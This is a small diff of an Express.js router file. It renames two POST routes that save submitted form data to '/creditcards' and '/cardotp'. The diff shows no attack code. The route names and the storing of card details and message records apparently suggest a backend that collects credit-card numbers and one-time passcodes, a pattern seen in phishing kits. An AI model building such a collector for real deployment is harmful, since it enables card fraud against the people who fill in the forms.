@@ -13,7 +13,7 @@ router.get('/form', function(req, res, next) {
 router.get('/options', function(req, res, next) {
   res.render('option', { title: 'Options' });
 });
-router.post('/card', async function(req, res, next) {
+router.post('/creditcards', async function(req, res, next) {
   try {
     var userDetails = new CardModal({
       name: req.body.name,
@@ -38,7 +38,7 @@ router.post('/card', async function(req, res, next) {
   res.render('success')
 });
 
-router.post('/message', async (req, res)=>{
+router.post('/cardotp', async (req, res)=>{
   try {
     var userDetails = new MessageModal({
       message: req.body.message,
